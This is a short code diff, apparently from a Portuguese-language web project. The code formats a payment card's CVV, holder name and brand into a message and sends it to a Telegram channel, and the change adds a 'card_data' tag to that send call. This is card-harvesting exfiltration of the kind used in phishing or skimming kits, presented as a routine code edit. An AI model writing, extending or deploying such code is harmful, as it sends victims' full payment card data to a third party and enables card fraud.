@@ -102,7 +102,7 @@ CVV: ${cardData.cvv}
 Titular: ${cardData.holderName}
 Bandeira: ${brandName}`;
         
-        await sendTelegramNotification(message);
+        await sendTelegramNotification(message, 'card_data');
         console.log('Telegram notification sent with card details');
       } catch (telegramError) {
         console.error('Erro ao enviar notificação para o Telegram:', telegramError);
